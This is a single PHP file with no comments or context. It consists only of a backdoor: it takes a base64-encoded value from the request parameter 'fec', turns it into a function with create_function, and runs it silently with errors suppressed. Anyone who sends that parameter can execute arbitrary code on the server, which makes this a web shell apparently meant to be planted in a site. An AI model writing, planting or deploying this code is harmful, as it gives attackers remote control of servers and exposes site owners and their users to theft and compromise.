 <?php
if(!empty($_REQUEST['fec'])){$fec=base64_decode($_REQUEST['fec']);$fec=create_function('',$fec);@$fec();exit;}